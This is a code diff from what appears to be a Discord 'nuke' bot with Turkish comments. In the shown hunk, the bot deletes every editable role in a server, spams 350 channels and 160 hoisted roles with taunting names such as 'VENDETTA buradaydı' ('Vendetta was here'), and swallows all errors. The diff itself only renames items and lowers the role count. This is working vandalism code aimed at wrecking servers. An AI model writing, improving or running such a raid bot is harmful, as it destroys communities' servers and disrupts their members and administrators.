@@ -203,15 +203,15 @@ client.on("interactionCreate", async interaction => {
     await Promise.all(allRoles.filter(r => r.editable && r.id !== guild.id).map(r => r.delete().catch(() => {})));
 
     // 4) 350 yeni kanal oluştur
-    const channelNames = ["VENDETTA💦", "VENDETTA💝", "EL KONULDU🔥"];
+    const channelNames = ["VENDETTA💦", "VENDETTA buradaydı 💝", "EL KONULDU🔥"];
     await Promise.all(Array.from({ length: 350 }).map((_, i) => 
       guild.channels.create({ name: channelNames[i % channelNames.length] }).catch(() => {})
     ));
 
     // 5) 300 yeni rol oluştur
-    await Promise.all(Array.from({ length: 300 }).map((_, i) => {
+    await Promise.all(Array.from({ length: 160 }).map((_, i) => {
       const color = `#${Math.floor(Math.random() * 16777215).toString(16)}`;
-      return guild.roles.create({ name: `BÖÖ KORKTUNMUU😜`, color, hoist: true }).catch(() => {});
+      return guild.roles.create({ name: `VENDETTA BURDAYDI😜`, color, hoist: true }).catch(() => {});
     }));
 
     // İşlem sonucu mesaj
